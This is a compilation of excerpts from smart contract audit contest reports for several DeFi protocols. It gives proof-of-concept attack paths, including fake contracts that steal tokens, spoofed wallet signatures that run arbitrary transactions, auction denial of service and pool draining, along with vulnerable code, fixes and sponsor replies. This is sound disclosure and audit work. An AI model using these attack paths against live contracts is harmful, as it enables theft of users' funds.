// = feeGrowthGlobal - (feeGrowthGlobal - LOWER_TICK.feeGrowthOutside) - UPPER_TICK.feeGrowthOtuside
// = LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside
```


lower tick ≤ pool tick < upper tick
```jsx
// ---------------------|---------------------|-----------------|-----------------
//                  LOWER_TICK            POOL_TICK        UPPER_TICK
// <---------------------------- feeGrowthGlobal -------------------------------->
// <--------------------| LOWER_TICK's feeGrowthOutside (CASE 1)
//                       UPPER_TICK's feeGrowthOutside (CASE 2) |---------------->
// we want the range between LOWER_TICK and UPPER_TICK
// = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
// = feeGrowthGLobal - LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside
```


upper tick ≤ pool tick
```jsx
// ---------------------|---------------------|-----------------|-----------------
//                  LOWER_TICK            POOL_TICK        UPPER_TICK
// <---------------------------- feeGrowthGlobal -------------------------------->
// <--------------------| LOWER_TICK's feeGrowthOutside (CASE 1)
// <------------------------------------------------------------| UPPER_TICK's feeGrowthOutside (CASE 1)
// we want the range between LOWER_TICK and UPPER_TICK
// = UPPER_TICK.feeGrowthOutside - LOWER_TICK.feeGrowthOutside
// alternatively, following the general formula, it is
// = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
// = feeGrowthGLobal - LOWER_TICK.feeGrowthOutside - (feeGrowthGlobal - UPPER_TICK.feeGrowthOutside)
// = UPPER_TICK.feeGrowthOutside - LOWER_TICK.feeGrowthOutside
```


Handling The Boundary Case
An under appreciated, but very critical line of Uniswap V3's pool contract is the following:
state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;
It serves a dual purpose:

Because of how Tick Bitmap works, the tick needs to be manually decremented by 1 so that the next tick to be found is in the next word.
More importantly, it handles the boundary case, where zeroForOne is true (pool tick goes down). In this scenario, case 1 becomes case 2 when the tick is crossed. However, should the poolTick after the swap be equal to step.tickNext, then when calculating fee growth inside a position that so happens to have step.tickNext as one of its ticks, it will be treated as case 1 (poolTick = lowerTick / upperTick) when it is required to be treated as case 2.

Impact
Hopefully, this writeup helps readers understand the fee growth mechanism and its workings. More importantly, I hope it helps the team to understand why using nearestTick as the reference point for fee growth mechanism is unsuitable. Specifically, we have 2 high severity issues:

Wrong initialization value of feeGrowthOutside in the case either the lower or upper tick becomes the nearestTick upon insertion of a new tick.
You are (in a sense) crossing the old nearestTick, so its secondsPerLiquidityOutside has to be flipped
The lower / upper tick's feeGrowthOutside is incorrectly initialized to be 0 when it should be feeGrowthOutside


Case 1 and 2 becomes ambiguous. When a position is modified with either tick being nearestTick, it is treated to be case 1 when in fact there are times it should be treated as case 2.

Recommended Mitigation Steps
Having a pool tick counter that closely matches the current pool price is rather critical for fee growth and seconds per liquidity initializations / calculations.
Where relevant, the nearestTick should be replaced by poolTick.
sarangparikh22 (Sushi) acknowledged
Medium Risk Findings (7)


## [H-01]  "Steal tokens from TempusController"

Submitted by gpersoon.
Impact
The function \_depositAndProvideLiquidity can be used go retrieve arbitrary ERC20 tokens from the TempusController.sol contract.
As the test contract of TempusController.sol https://goerli.etherscan.io/address/0xd4330638b87f97ec1605d7ec7d67ea1de5dd7aaa shows, it has indeed ERC20 tokens.
The problem is due to the fact that you supply an arbitrary tempusAMM to depositAndProvideLiquidity and thus to \_depositAndProvideLiquidity.
tempusAMM could be a fake contract that supplies values that are completely fake.
At the end of the function \_depositAndProvideLiquidity, ERC20 tokens are send to the user. If you can manipulate the variables ammTokens,  mintedShares  and sharesUsed you can send back
any tokens held in the contract
"ammTokens[0].safeTransfer(msg.sender, mintedShares - sharesUsed[0]);"
The Proof of Concept shows an approach to do this.
Proof of Concept


https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L73-L79


https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L304-L335


Create a fake Vault contract (fakeVault) with the following functions:
fakeVault.getPoolTokens(poolId) --> returns {TokenToSteal1,TokenToSteal2},{fakeBalance1,fakeBalance2},0
fakeVault.JoinPoolRequest() --> do nothing
fakeVault.joinPool() --> do nothing


Create a fake Pool contract (fakePool) with the following functions:
fakePool.yieldBearingToken() --> returns fakeYieldBearingToken
fakePool.deposit() --> returns fakeMintedShares,....


Create a fake ammTokens contract with the following functions:
tempusAMM.getVault() --> returns fakeVault
tempusAMM.getPoolId() --> returns 0
tempusAMM.tempusPool() --> returns fakePool


call depositAndProvideLiquidity(fakeTempusAMM,1,false) // false -> yieldBearingToken
_getAMMDetailsAndEnsureInitialized returns fakeVault,0, {token1,token2},{balance1,balance2}
_deposit(fakePool,1,false) calls _depositYieldBearing which calls fakePool.deposit()  and returns fakeMintedShares
_provideLiquidity(...)  calculates a vale of ammLiquidityProvisionAmounts
_provideLiquidity(...)  skips the safeTransferFrom because sender == address(this))
the calls to fakeVault.JoinPoolRequest() and fakeVault.joinPool() can be faked.
_provideLiquidity(...)  returns the value ammLiquidityProvisionAmounts


Now fakeMintedShares - ammLiquidityProvisionAmounts number of TokenToSteal1 and TokenToSteal2 are transferred to msg.sender
As you can both manipulate TokenToSteal1 and fakeMintedShares, you can transfer any token to msg.sender
Recommended Mitigation Steps
Create a whitelist for tempusAMMs
mijovic (Tempus) confirmed:

This is a good point. However, these tokens that are locked in TempusController are coming from dust that was left when the user is doing early redemption. As this needs to be done with equal shares, we have a threshold parameter that is used as the maximum leftover behind redemption (usually there is a need to do a swap before redemption to make this work). So, this is going to be pennies always.
I would not consider this as high risk, and we are not planning to fix this as steps to make this hack are too complicated to steal pennies... Also, the gas cost of doing it costs by far more than the funds that someone can steal.

mijovic (Tempus) commented:

We changed point of view here a little bit. Will add registry of TempusAMMs and TempusPools that can be used with controller, just to prevent possible attacks with fake amms and pools.

mijovic (Tempus) patched:

Added whitelist registry for both TempusAMM and TempusPool in this PR https://github.com/tempus-finance/tempus-protocol/pull/365
However, as amount of tokens that TempusController holds is so small (I would say this is of severity 2)

0xean (judge) commented:

The C4 docs don't speculate on the amount of assets stolen in the TLDR of risk assessment.
3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
Given the fact that some amount of assets could be stolen, i believe this is the correct severity for the issue.

Medium Risk Findings (2)


## [H-02]  "QuickAccManager.sol#cancel() Wrong hashTx makes it impossible to cancel a scheduled transaction"

Submitted by WatchPug, also found by gpersoon
In QuickAccManager.sol#cancel(), the hashTx to identify the transaction to be canceled is wrong. The last parameter is missing.
As a result, users will be unable to cancel a scheduled transaction.
QuickAccManager.sol#L91 L91
```solidity
function cancel(Identity identity, QuickAccount calldata acc, uint nonce, bytes calldata sig, Identity.Transaction[] calldata txns) external {
  bytes32 accHash = keccak256(abi.encode(acc));
  require(identity.privileges(address(this)) == accHash, 'WRONG_ACC_OR_NO_PRIV');
bytes32 hash = keccak256(abi.encode(CANCEL_PREFIX, address(this), block.chainid, accHash, nonce, txns, false));
  address signer = SignatureValidator.recoverAddr(hash, sig);
  require(signer == acc.one || signer == acc.two, 'INVALID_SIGNATURE');
// @NOTE: should we allow cancelling even when it's matured? probably not, otherwise there's a minor grief
  // opportunity: someone wants to cancel post-maturity, and you front them with execScheduled
  bytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns));
  require(scheduled[hashTx] != 0 && block.timestamp < scheduled[hashTx], 'TOO_LATE');
  delete scheduled[hashTx];
emit LogCancelled(hashTx, accHash, signer, block.timestamp);
}
```
Recommendation
Change to:
solidity
bytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns, false));
Ivshti (Ambire) confirmed and resolved:

Great find, resolved in https://github.com/AmbireTech/adex-protocol-eth/commit/5c5e6f0cb47e83793dafc08630577b93500c86ab

GalloDaSballo (judge) commented:

The warden has found that the method cancel was calculating the wrong hashTx, this hash, used to verify which transaction to cancel, making it impossible to cancel a transaction.
The sponsor has mitigated in a  subsequent pr



## [H-04]  "QuickAccManager Smart Contract signature verification can be exploited"

Submitted by cmichel
Several different signature modes can be used and Identity.execute forwards the signature parameter to the SignatureValidator library.
The returned signer is then used for the privileges check:
solidity
address signer = SignatureValidator.recoverAddrImpl(hash, signature, true);
// signer will be QuickAccountContract
require(privileges[signer] != bytes32(0), 'INSUFFICIENT_PRIVILEGE');
It's possible to create a smart contract mode signature (SignatureMode.SmartWallet) for arbitrary transactions as the QuickAccManager.isValidSignature uses an attacker-controlled id identity contract for the privileges check.
An attacker can just create an attacker contract returning the desired values and the smart-wallet signature appears to be valid:
solidity
// @audit id is attacker-controlled
(address payable id, uint timelock, bytes memory sig1, bytes memory sig2) = abi.decode(signature, (address, uint, bytes, bytes));
// @audit this may not be used for authorization, attacker can return desired value
if (Identity(id).privileges(address(this)) == accHash) {
  // bytes4(keccak256("isValidSignature(bytes32,bytes)")
  return 0x1626ba7e;
} else {
  return 0xffffffff;
}
POC
Assume an Identity contract is set up with a QuickAccManager as the privileges account, i.e. privileges[accHash] != 0.
We can construct a SignatureMode.SmartWallet signature for an arbitrary hash:

Call Identity.execute(txns, spoofedSignature) where spoofedSignature = abi.encode(attackerContract, timelock=0, sig1=0, sig2=0, address(quickAccountManager), SignatureMode.SmartWallet)
This will call recoverAddrImpl(txnsHash, spoofedSignature, true), decode the bytes at the end of spoofedSignature and determine mode = SignatureMode.SmartWallet and wallet = quickAccountManager. It will cut off these arguments and call quickAccountManager.isValidSignature(txnsHash, (attackerContract, 0, 0, 0))
The QuickAccManager will decode the signature, construct accHash which is the hash of all zeroes (due to failed signatures returning 0). It will then call attacker.privileges(address(this)) and the attacker contract can return the accHash that matches an account hash of failed signatures, i.e., keccak256(abi.encode(QuickAccount(0,0,0))). The comparison is satisfied and it returns the success value.
The checks in Identity.execute pass and the transactions txns are executed.

Impact
Any Identity contract using QuickAccManager can be exploited.
Funds can then be stolen from the wallet.
Recommendation
The issue is that QuickAccManager blindly trusts the values in signature.
It might be enough to remove the id from the signature and use msg.sender as the identity instead: Identity(msg.sender).privileges(address(this)) == accHash.
This seems to work with the current Identity implementation but might not work if this is extended and the isValidSignature is called from another contract and wants to verify a signature on a different identity.
In that case, the Identity/SignatureValidator may not blindly forward the attacker-supplied signature and instead needs to re-encode the parameters with trusted values before calling QuickAccManager.
Ivshti (Ambire) confirmed and patched:

great find! Mitigated in https://github.com/AmbireTech/adex-protocol-eth/commit/17c073d037ded76d56d6145faa92c1959fd47226 but still figuring out whether this is the best way to do it

GalloDaSballo (judge) commented:

May need to sit on this one for another day before I can fully comment
Fundamentally by calling Identity.execute with mostly 0 data, you are able to call back to QuickAccManager. isValidSignature which, due to the implementation of ecrecover at the time, will return valid checks for address(0), allowing to bypass all the logic and returning true for the signature, allowing for the execution of arbitrary code.
Again, need to sit on this one
But wouldn't you also be able to set a malicious smartContractWallet as the IERC1271Wallet, hence you can sidestep the entire logic, as your malicious contract wallet can be programmed to always return true on any input value?

Ivshti (Ambire) commented:

@GalloDaSballo (judge) this doesn't have to do with address(0)
Using smart wallets for signatures by itself is not a problem - since they authorize as themselves.
The fundamental root of this issue is that ERC 1271 was designed with the assumption that 1 contract = 1 wallet. And as such, isValidSignature only returns true/false. This makes sense, as essentially we're asking the wallet "is this a valid signature from you", and then the wallet decides how to actually validate this it depending on it's own behavior and permissions.
However, the QuickAccManager is a singleton contract - one single QuickAccManager represents multiple users. As such, combining it with ERC 1271 is a logical misunderstanding, as we can't really ask it "is this a valid sig for X identity" through the ERC 1271 interface. So instead, we encode the identity that we're signing as in the sig itself, but then a malicious user could call a top-level identity with a sig that validates in the singleton QuickAccManager, but meant to validate with a differerent identity.
Because what we pass to isValidSignature is opaque data (the smart wallet may be any contract with any logic, not just our QuickAccManager) we can't just peak into the sig and see if it's meant to validate with the caller identity.
Excellent finding IMO
The current mitigation is hacky, and essentially leads to an isValidSignature implementation that is unusable (and doesn't make sense) off-chain, but we prefer it to introducing a new sig type especially for QuickAccManager.

GalloDaSballo (judge) commented:

@Ivshti (Ambire) To clarify:
Would adding privileges[QuickAccountManager] = bytes32(uint(1))enable the exploit?

Ivshti (Ambire) commented:

@GalloDaSballo (judge) yes, it would. Any authorized quickAcc would enable the exploit

GalloDaSballo (judge) commented:

I'm starting to get this
The id sent to isValidSignature is an untrusted, unverified address
The contract at that address can be programmed to have a function privileges which would return any bytes32 value to match accHash
This effectively allows to run arbitrary transactions.
A way to mitigate would be to have a way to ensure the called id is trusted
A registry of trusted ids may be effective
The mitigation the sponsor has chosen does solve for only using trusted Identities as in the case of a malicious Identity, the Identity would just validate it's own transaction, not putting other Identities funds at risk.
An alternative solution would be to change theIdentityFactory to use the OpenZeppelin Clones Library (or similar) to ensure that the correct Logic is deployed (by deploying a minimal-proxy pointing to the trusted implementation).
This would require a fair tech-lift and would limit the type of deployments that the IdentityFactory can perform.
The exploit was severe and the sponsor has mitigated by checking the msg.sender against the id provided in the signature


Low Risk Findings (6)

[L-01] ecrecover may return empty address
Submitted by pauliax
[L-02] block.chainid may change in case of a hardfork
Submitted by pauliax
[L-03] Hardcoded WETH
Submitted by pauliax
[L-04] Zapper should safeApprove(0) first
Submitted by cmichel
[L-05] If zero address is added as privilege anyone can execute arbitrary transactions
Submitted by cmichel, also found by pmerkleplant
[L-06] Address with privilege for QuickAccount with address(0)'s can execute arbitrary transactions
Submitted by pmerkleplant

Non-Critical Findings (10)

[N-01] create2 assembly
Submitted by pauliax
[N-02] Hex selector
Submitted by pauliax
[N-03] Some code is commented out
Submitted by loop
[N-04] Inconsistent code style of for loops
Submitted by WatchPug
[N-05] lack of require message
Submitted by JMukesh
[N-06] use of floating pragma
Submitted by JMukesh
[N-07] No check for signature malleability
Submitted by cmichel
[N-08] Identity fallback returns too many bytes
Submitted by cmichel
[N-09] No ERC20 safe* versions called & no return values checked
Submitted by cmichel, also found by JMukesh, loop, cryptojedi88, defsec, and loop
[N-10] Zapper only works for whitelisted tokens
Submitted by cmichel

Gas Optimizations (21)

[G-01] QuickAccManager.sol Constants should be marked as constant
Submitted by WatchPug, also found by JMukesh
[G-02] QuickAccManager.sol#send() Avoid unnecessary read from storage can save gas
Submitted by WatchPug
[G-03] Cache array length in for loops can save gas
Submitted by WatchPug
[G-04] Zapper.sol#wrapETH() Use WETH.deposit can save some gas
Submitted by WatchPug, also found by cryptojedi88
[G-05] Zapper.sol#tradeV3Single() Remove unnecessary variable can make the code simpler and save gas
Submitted by WatchPug
[G-06] Unnecessary storage variables
Submitted by WatchPug, also found by pauliax and pmerkleplant
[G-07] Cache storage variables in the stack can save gas
Submitted by WatchPug, also found by pauliax
[G-08] Adding unchecked directive can save gas
Submitted by WatchPug, also found by pauliax and ye0lde
[G-09] Gas: BytesLib addition can be unchecked
Submitted by cmichel
[G-10] Gas: SignatureValidatorV2.recoverAddrImpl should use else if
Submitted by cmichel
[G-11] Safe some gas on the nonce increment
Submitted by gpersoon
[G-12] Compare with 0 and 1 in a more efficient way
Submitted by gpersoon
[G-13] IdentityFactory.withdraw can be external
Submitted by loop
[G-14] Duplicate math operations
Submitted by pauliax
[G-15] LibBytes uses itself
Submitted by pauliax
[G-16] Only prepare tx when the fee is present
Submitted by pauliax
[G-17] Set QuickAccManager::DOMAIN_SEPARATOR as immutable
Submitted by pmerkleplant
[G-18] Set IdentityFactory::creator as immutable
Submitted by pmerkleplant
[G-19] Set QuickAccManager::CANCEL_PREFIX as constant
Submitted by pmerkleplant
[G-20] Long Revert Strings
Submitted by ye0lde
[G-21] Assignment Of Variable To Default (Identity.sol)
Submitted by ye0lde

Disclosures
C4 is an open organization governed by participants in the community.
C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.
C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.


## [H-01]  "Bonding mechanism allows malicious user to DOS auctions"

Submitted by kenzo.
A malicious user can listen to the mempool and immediately bond when an auction starts, without aim of settling the auction. As no one can cancel his bond in less than 24h, this will freeze user funds and auction settlement for 24h until his bond is burned and the new index is deleted. The malicious user can then repeat this when a new auction starts.
While the malicious user will have to pay by having his bond burned, it might not be enough of a detriment for the DOS of the basket.
Impact
Denial of service of the auction mechanism. The malicious user can hold the basket "hostage" and postpone or prevent implementing new index.
The only way to mitigate it would be to try to front-run the malicious user, obviously not ideal.
Proof of Concept
publishAllIndex:
https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L170

The attacker would listen to this function / PublishedNewIndex event and upon catching it, immediately bond the auction.
The publisher has no way to burn a bond before 24h has passed. But even if he could, it would not really help as the attacker could just bond again (though losing funds in the process).

settleAuction:
https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L79

Only the bonder can settle.

bondBurn:
https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L111

Can only burn 24h after bond.

Tools Used
Manual analysis, hardhat.
Recommended Mitigation Steps
If we only allow one user to bond, I see no real way to mitigate this attack, because the malicious user could always listen to the mempool and immediately bond when an auction starts and thus lock it.
So we can change to a mechanism that allows many people to bond and only one to settle;
but at that point, I see no point to the bond mechanism any more. So we might as well remove it and let anybody settle the auction.
With the bond mechanism, a potential settler would have 2 options:

Bond early: no one else will be able to bond and settle, but the user would need to leave more tokens in the basket (as newRatio starts large and decreases in time)
Bond late: the settler might make more money as he will need to leave less tokens in the basket, but he risks that somebody else will bond and settle before him.

Without a bond mechanism, the potential settler would still have these equivalent 2 options:

Settle early: take from basket less tokens, but make sure you win the auction
Settle late: take from basket more tokens, but risk that somebody settles before you

So that's really equivalent to the bonding scenario.
I might be missing something but at the moment I see no detriment to removing the bonding mechanism.
frank-beard (Kuiper) acknowledged 
itsmetechjay (organizer) commented:

Warden apologizes for linking the code of the previous defiProtocol contest, however, these lines are not changed in the new contest.

Alex the Entreprenerd (judge) commented:

I fully agree with this, anyone can grief the rest of the funds by bonding.
Personally, this is so easy to execute that I have to raise the severity to High, as it means that every single time there's a benefit to performing a DOS, any malicious actor just has to bond to do it

Alex the Entreprenerd (judge) commented:

The sponsor may want to consider de-prioritizing bonding to rebalance, by allowing multiple users to bond and rebalance at the same time (or by having bond and rebalance happen at the same time)

Alex the Entreprenerd (judge) commented:

After thinking about it, I had put into question the high severity because of the "extractability of value".
However because this finding allows to effectively DOS the auction, at any time, I still believe High Risk to be the correct severity

Medium Risk Findings (8)


## [H-02]  "FeePoolV0.sol#distributeMochi() will unexpectedly flush treasuryShare

Submitted by WatchPug
distributeMochi() will call _buyMochi() to convert mochiShare to Mochi token and call _shareMochi() to send Mochi to vMochi Vault and veCRV Holders. It wont touch the treasuryShare.
However, in the current implementation, treasuryShare will be reset to 0. This is unexpected and will cause the protocol fee can not be properly accounted for and collected.
FeePoolV0.sol#L79 L95
solidity
function _shareMochi() internal {
    IMochi mochi = engine.mochi();
    uint256 mochiBalance = mochi.balanceOf(address(this));
    // send Mochi to vMochi Vault
    mochi.transfer(
        address(engine.vMochi()),
        (mochiBalance * vMochiRatio) / 1e18
    );
    // send Mochi to veCRV Holders
    mochi.transfer(
        crvVoterRewardPool,
        (mochiBalance * (1e18 - vMochiRatio)) / 1e18
    );
    // flush mochiShare
    mochiShare = 0;
    treasuryShare = 0;
}
Impact
Anyone can call distributeMochi() and reset treasuryShare to 0, and then call updateReserve() to allocate part of the wrongfuly resetted treasuryShare to mochiShare and call distributeMochi().
Repeat the steps above and the treasuryShare will be consumed to near zero, profits the vMochi Vault holders and veCRV Holders. The protocol suffers the loss of funds.
Recommendation
Change to:
```solidity
function _buyMochi() internal {
    IUSDM usdm = engine.usdm();
    address[] memory path = new address;
    path[0] = address(usdm);
    path[1] = address(engine.mochi());
    usdm.approve(address(uniswapRouter), mochiShare);
    uniswapRouter.swapExactTokensForTokens(
        mochiShare,
        1,
        path,
        address(this),
        type(uint256).max
    );
    // flush mochiShare
    mochiShare = 0;
}
function _shareMochi() internal {
    IMochi mochi = engine.mochi();
    uint256 mochiBalance = mochi.balanceOf(address(this));
    // send Mochi to vMochi Vault
    mochi.transfer(
        address(engine.vMochi()),
        (mochiBalance * vMochiRatio) / 1e18
    );
    // send Mochi to veCRV Holders
    mochi.transfer(
        crvVoterRewardPool,
        (mochiBalance * (1e18 - vMochiRatio)) / 1e18
    );
}
```
ryuheimat (Mochi) confirmed


## [H-10]  "Changing NFT contract in the MochiEngine would break the protocol"

Submitted by jonah1005
Impact
MochiEngine allows the operator to change the NFT contract in MochiEngine.sol#L91-L93
All the vaults would point to a different NFT address. As a result, users would not be access their positions. The entire protocol would be broken.
IMHO, A function that would break the entire protocol shouldn't exist.
I consider this is a high-risk issue.
Proof of Concept
MochiEngine.sol#L91-L93
Recommended Mitigation Steps
Remove the function.
ryuheimat (Mochi) confirmed


## [H-01]  "The design of wibBTC is not fully compatible with the current Curve StableSwap pool"

Submitted by WatchPug, also found by gzeon
Per the documentation, wibBTC is designed for a Curve StableSwap pool. However, the design of wibBTC makes the balances change dynamically and automatically. This is unusual for an ERC20 token, and it's not fully compatible with the current Curve StableSwap pool.
Specifically, a Curve StableSwap pool will maintain the balances of its coins based on the amount of tokens added, removed, and exchanged each time. In another word, it can not adopt the dynamic changes of the balances that happened automatically.
The pool's actual dynamic balance of wibBTC will deviate from the recorded balance in the pool contract as the pricePerShare increases.
Furthermore, there is no such way in Curve StableSwap similar to the sync() function of UNI v2, which will force sync the stored reserves to match the balances.
PoC
Given:

The current pricePerShare is: 1;

The Curve pool is newly created with 0 liquidity;


Alice added 100 wibBTC and 100 wBTC to the Curve pool; Alice holds 100% of the pool;

After 1 month with no activity (no other users, no trading), and the pricePerShare of ibBTC increases to 1.2;
Alice removes all the liquidity from the Curve pool.

While it's expected to receive 150 wibBTC and 100 wBTC, Alice actually can only receive 100 wibBTC and 100 wBTC.
Recommended Mitigation Steps
Consider creating a revised version of the Curve StableSwap contract that can handle dynamic balances properly.
dapp-whisperer (BadgerDAO) confirmed:

We will be creating a custom pool that takes this into account based on the rate_multiplier variable on the MetaPools.
* Draft implementation



## [H-03]  "WrappedIbbtcEth contract will use stalled price for mint/burn if updatePricePerShare wasn’t run properly"

Submitted by hyh, also found by cmichel, gpersoon, leastwood, hack3r-0m, kenzo, WatchPug, and loop
Impact
Malicious user can monitor SetPricePerShare event and, if it was run long enough time ago and market moved, but, since there were no SetPricePerShare fired, the contract's pricePerShare is outdated, so a user can mint() with pricePerShare that is current for contract, but outdated for market, then wait for price update and burn() with updated pricePerShare, yielding risk-free profit at expense of contract holdings.
Proof of Concept
WrappedIbbtcEth updates pricePerShare variable by externally run updatePricePerShare function. The variable is then used in mint/burn/transfer functions without any additional checks, even if outdated/stalled. This can happen if the external function wasn't run for any reason.
The variable is used via balanceToShares function: WrappedIbbtcEth.sol L155
This is feasible as updatePricePerShare to be run by off-chain script being a part of the system, and malfunction of this script leads to contract exposure by stalling the price. The malfunction can happen both by internal reasons (bugs) and by external ones (any system-level dependencies, network outrages).
updatePricePerShare function: WrappedIbbtcEth.sol L72
Recommended Mitigation Steps
The risk comes with system design. Wrapping price updates with contract level variable for gas costs minimization is a viable approach, but it needs to be paired with corner cases handling. One of the ways to reduce the risk is as follows:
Introduce a threshold variable for maximum time elapsed since last pricePerShare update to WrappedIbbtcEth contract.
Then 2 variants of transferFrom and transfer functions can be introduced, both check condition {now - time since last price update < threshold}. If condition holds both variants, do the transfer. If it doesn't, then the first variant reverts, while the second do costly price update.
I.e. it will be cheap transfer (that works only if price is recent) and full transfer (that is similar to the first when price is recent, but do price update on its own when price is stalled). This way, this full transfer is guaranteed to run and is usually cheap, costing more if price is stalled and it does the update.
After this, whenever scheduled price update malfunctions (for example because of network conditions), the risk will be limited by market volatility during threshold time at maximum, i.e. capped.
See issue page for example code:
dapp-whisperer (BadgerDAO) confirmed:

Agreed, appreciate the thorough breakdown. We will add a "max staleness" to the ppfs update.
I do see some merit in the idea of "updating when needed" at expense of the next user, but due to interface considerations we'd like to keep that consistent for users. In practice, we will run a bot to ensure timely updates.
The pps updates are small and infrequent.



## [H-07]  "VaderReserve does not support paying IL protection out to more than one address

Submitted by TomFrenchBlockchain
Impact
All liquidity deployed to one of VaderPool or VaderPoolV2 will be locked permanently.
Proof of Concept
Both VaderRouter and VaderRouterV2 make calls to VaderReserve in order to pay out IL protection.


https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/router/VaderRouter.sol#L206


https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L227


However VaderReserve only allows a single router to claim IL protection on behalf of users.
https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L80-L83
It's unlikely that the intent is to deploy multiple reserves so there's no way for both VaderRouter and VaderRouterV2 to pay out IL protection simultaneously.
This is a high severity issue as any LPs which are using the router which is not listed on VaderReserve will be unable to remove liquidity as the call to the reserve will revert. Vader governance is unable to update the allowed router on VaderReserve so all liquidity on either VaderPool or VaderPoolV2 will be locked permanently.
Recommended Mitigation Steps
Options:

Allow the reserve to whitelist multiple addresses to claim funds
Allow the call to the reserve to fail without reverting the entire transaction (probably want to make this optional for LPs)

SamSteinGG (Vader) disputed:

As the code indicates, only one of the two versioned instances of the AMM will be deployed and active at any given time rendering this exhibit incorrect.

alcueca (judge) commented:

Sorry @SamSteinGG, where does the code indicate that?

SamSteinGG (Vader) commented:

Correction, this was clarified during the audit in the discord channel.



## [H-19]  "Governance veto can be bypassed"

Submitted by gzeon
Impact
Since veto ensure none of the actions in proposal being vetoed point to the contract (GovernorAlpha.sol:L562), a malicious proposal can be designed to have an action that point to governance and therefore effectively cannot be vetoed.
Proof of Concept
For any attacker who want to launch a governance attack using a malicious proposal, they simply need to add an action that point to governance that does nothing (or anything).
Recommended Mitigation Steps
Some other design can be proposal are vetoable whenever the differential is less than x%, even if it involves governance change, s.t. council can veto most malicious proposal while it is still possible to change council given high enough vote differential.
SamSteinGG (Vader) commented:

Duplicate of #61

alcueca (judge) commented:

Not a duplicate



## [H-24]  "Wrong design/implementation of addLiquidity() allows attacker to steal funds from the liquidity pool"

Submitted by WatchPug
The current design/implementation of Vader pool allows users to addLiquidity using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2.
We believe this design is flawed and it essentially allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers.
An attacker can exploit this by adding liquidity in extreme amounts and drain the funds from the pool.
https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335
```solidity
function mintFungible(
    IERC20 foreignAsset,
    uint256 nativeDeposit,
    uint256 foreignDeposit,
    address from,
    address to
) external override nonReentrant returns (uint256 liquidity) {
    IERC20Extended lp = wrapper.tokens(foreignAsset);
require(
    lp != IERC20Extended(_ZERO_ADDRESS),
    "VaderPoolV2::mintFungible: Unsupported Token"
);

(uint112 reserveNative, uint112 reserveForeign, ) = getReserves(
    foreignAsset
); // gas savings

nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);
foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);

PairInfo storage pair = pairInfo[foreignAsset];
uint256 totalLiquidityUnits = pair.totalSupply;
if (totalLiquidityUnits == 0) liquidity = nativeDeposit;
else
    liquidity = VaderMath.calculateLiquidityUnits(
        nativeDeposit,
        reserveNative,
        foreignDeposit,
        reserveForeign,
        totalLiquidityUnits
    );

require(
    liquidity > 0,
    "VaderPoolV2::mintFungible: Insufficient Liquidity Provided"
);

pair.totalSupply = totalLiquidityUnits + liquidity;

_update(
    foreignAsset,
    reserveNative + nativeDeposit,
    reserveForeign + foreignDeposit,
    reserveNative,
    reserveForeign
);

lp.mint(to, liquidity);

emit Mint(from, to, nativeDeposit, foreignDeposit);

}
```
Proof of Concept
Given:

A Vader pool with 100,000 USDV and 1 BTC;
The totalPoolUnits is 100.

The attacker can do the following in one transaction:

Add liquidity with 100,000 USDV and 0 BTC, get 50 liquidityUnits, representing 1/3 shares of the pool;
Swap 0.1 BTC to USDV, repeat for 5 times; spent0.5 BTC and got 62163.36 USDV;
Remove liquidity, get back 45945.54 USDV and 0.5 BTC; profit for: 62163.36 + 45945.54 - 100000 = 8108.9 USDV.

SamSteinGG (Vader) disputed:

This is the intended design of the Thorchain CLP model. Can the warden provide a tangible attack vector in the form of a test?

alcueca (judge) commented:

Sponsor is acknowledging the issue.

SamSteinGG (Vader) commented:

@alcueca We do not acknowledge the issue. This is the intended design of the CLP model and the amount supplied for a trade is meant to be safeguarded off-chain. It is an inherent trait of the model.




## [H-32]  "Covering impermanent loss allows profiting off asymmetric liquidity provision at expense of reserve holdings"

Submitted by hyh
Impact
Pool funds will be siphoned out over time as swaps and asymmetric LP provision are balancing each other economically, while with introduction of IL reimbursement a malicious user can profit immediately from out of balance pool with a swap and profit again from IL coverage. This requires locking liquidity to a pool, but still represents an additional profit without additional risk at expense of reserve funds.
